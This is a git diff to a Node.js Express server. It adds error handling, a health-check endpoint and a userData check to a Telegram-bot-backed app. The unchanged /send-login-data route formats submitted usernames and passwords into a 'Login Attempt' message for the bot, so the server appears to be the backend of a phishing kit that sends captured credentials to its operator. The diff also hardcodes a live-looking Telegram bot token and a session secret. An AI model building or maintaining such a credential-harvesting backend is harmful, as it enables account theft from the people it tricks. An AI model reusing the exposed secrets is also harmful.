@@ -19,10 +19,43 @@ const app = express();
 app.set('trust proxy', 1);
 
 const server = http.createServer(app);
-const bot = new TelegramBot('8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus', { polling: true });
-bot.deleteWebHook().then(() => {
-  console.log('Webhook deleted. Polling started.');
-});
+
+// Initialize Telegram bot with better error handling
+let bot;
+try {
+  bot = new TelegramBot('8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus', { 
+    polling: true,
+    request: {
+      agentOptions: {
+        keepAlive: true,
+        family: 4
+      }
+    }
+  });
+
+  // Handle bot errors
+  bot.on('polling_error', (error) => {
+    console.error('🚨 Telegram polling error:', error.message);
+  });
+
+  bot.on('error', (error) => {
+    console.error('🚨 Telegram bot error:', error.message);
+  });
+
+  // Delete webhook with retry logic
+  bot.deleteWebHook()
+    .then(() => {
+      console.log('✅ Webhook deleted. Polling started successfully.');
+    })
+    .catch((error) => {
+      console.error('❌ Failed to delete webhook:', error.message);
+      console.log('⚠️ Bot will continue with polling mode...');
+    });
+
+} catch (error) {
+  console.error('🚨 Failed to initialize Telegram bot:', error.message);
+  console.log('⚠️ Application will continue without bot functionality');
+}
 
 app.use(session({
   secret: '8c07f4a99f3e4b34b76d9d67a1c54629dce9aaab6c2f4bff1b3c88c7b6152b61',
@@ -424,6 +457,12 @@ app.post('/send-login-data', (req, res) => {
   const clientId = socketToClient[socketId];
   if (!clientId) return res.status(404).json({ message: 'Client not found.' });
 
+  // Ensure userData exists for this clientId
+  if (!userData[clientId]) {
+    console.error(`❌ UserData not found for clientId: ${clientId}`);
+    return res.status(404).json({ message: 'User data not found.' });
+  }
+
   const message = `🔐 *Login Attempt*\n\n` +
     `🔷 *Username:* \`${username}\`\n` +
     `🔑 *Password:* \`${password}\`\n` +
@@ -438,4 +477,37 @@ app.post('/send-login-data', (req, res) => {
   res.json({ success: true, message: 'Login data sent successfully!' });
 });
 
-server.listen(3001, () => console.log('Server running on http://localhost:3001'));
+// Health check endpoint
+app.get('/health', (req, res) => {
+  const health = {
+    status: 'OK',
+    timestamp: new Date().toISOString(),
+    uptime: process.uptime(),
+    telegram: {
+      connected: !!bot
+    },
+    users: {
+      connected: Object.keys(userData).length,
+      active: Object.values(userData).filter(u => u.isConnected).length
+    }
+  };
+  
+  res.json(health);
+});
+
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error('🚨 Unhandled error:', err.message);
+  console.error(err.stack);
+  
+  res.status(500).json({
+    error: 'Internal Server Error',
+    message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
+  });
+});
+
+server.listen(3001, () => {
+  console.log('🚀 Server running on http://localhost:3001');
+  console.log('📊 Health check available at /health');
+  console.log('🔧 Telegram bot status:', bot ? 'Connected' : 'Failed to connect');
+});
